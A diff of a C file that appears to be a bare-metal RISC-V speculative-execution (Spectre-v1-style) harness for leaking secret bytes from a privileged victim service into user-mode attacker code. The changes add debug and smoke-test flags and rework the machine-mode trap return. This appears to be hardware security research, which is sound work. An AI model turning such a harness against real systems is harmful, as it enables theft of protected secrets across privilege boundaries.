@@ -47,15 +47,23 @@
 #endif
 
 #ifndef ATTACKER_MPP
-#define ATTACKER_MPP 1
+#define ATTACKER_MPP 0
 #endif
 
 #ifndef USE_AM_CTE
-#define USE_AM_CTE 1
+#define USE_AM_CTE 0
 #endif
 
 #ifndef DIRECT_SERVICE_CALL
-#define DIRECT_SERVICE_CALL 1
+#define DIRECT_SERVICE_CALL 0
+#endif
+
+#ifndef LOW_ECALL_SMOKE
+#define LOW_ECALL_SMOKE 0
+#endif
+
+#ifndef DEBUG_TRAMPOLINE
+#define DEBUG_TRAMPOLINE 0
 #endif
 
 #define PROBE_ENTRIES 256u
@@ -96,7 +104,6 @@ static volatile uint64_t last_mepc;
 static volatile int attack_done;
 static volatile int attack_status;
 static uintptr_t saved_m_sp;
-static uintptr_t saved_m_ra;
 
 static uint8_t leaked_idx[SECRET_SZ][2];
 static uint64_t leaked_score[SECRET_SZ][2];
@@ -269,11 +276,22 @@ asm(
     "  addi sp, sp, 128\n"
     "  mret\n"
     "1:\n"
-    "  la t0, saved_m_sp\n"
-    "  ld sp, 0(t0)\n"
-    "  la t0, saved_m_ra\n"
-    "  ld ra, 0(t0)\n"
-    "  ret\n");
+    "  la t0, machine_low_return\n"
+    "  csrw mepc, t0\n"
+    "  li t0, 0x1800\n"
+    "  csrs mstatus, t0\n"
+    "  mret\n");
+
+void low_ecall_smoke_entry(void);
+asm(
+    ".section .text\n"
+    ".align 2\n"
+    ".globl low_ecall_smoke_entry\n"
+    "low_ecall_smoke_entry:\n"
+    "  li a7, 3\n"
+    "  li a0, 0\n"
+    "  ecall\n"
+    "1: j 1b\n");
 
 static inline void svc_victim(uint64_t idx, volatile uint8_t *probe)
 {
@@ -410,24 +428,38 @@ static void enter_user_attacker(void)
   uintptr_t user_sp = (uintptr_t)u_stack + sizeof(u_stack) - 16;
   uintptr_t mstatus;
 
+#if DEBUG_TRAMPOLINE
+  printf("[v1-priv-debug] enter_user_attacker begin\n");
+#endif
   init_pmp();
+#if DEBUG_TRAMPOLINE
+  printf("[v1-priv-debug] init_pmp done\n");
+#endif
   asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
   asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
   asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
   asm volatile("mv %0, sp" : "=r"(saved_m_sp));
-  asm volatile("mv %0, ra" : "=r"(saved_m_ra));
 
   asm volatile("csrr %0, mstatus" : "=r"(mstatus));
   mstatus = (mstatus & ~MSTATUS_MPP_MASK) | ((uint64_t)ATTACKER_MPP << 11);
   asm volatile("csrw mstatus, %0" :: "r"(mstatus) : "memory");
+#if DEBUG_TRAMPOLINE
+  printf("[v1-priv-debug] mret target=%p sp=%p mstatus=%p\n",
+         LOW_ECALL_SMOKE ? low_ecall_smoke_entry : attacker_entry,
+         (void *)user_sp, (void *)mstatus);
+#endif
 
   asm volatile(
       "mv sp, %0\n"
       "csrw mepc, %1\n"
       "mret\n"
+      ".globl machine_low_return\n"
+      "machine_low_return:\n"
+      "la t0, saved_m_sp\n"
+      "ld sp, 0(t0)\n"
       :
-      : "r"(user_sp), "r"((uintptr_t)attacker_entry)
-      : "memory");
+      : "r"(user_sp), "r"((uintptr_t)(LOW_ECALL_SMOKE ? low_ecall_smoke_entry : attacker_entry))
+      : "t0", "memory");
 }
 
 int main(void)
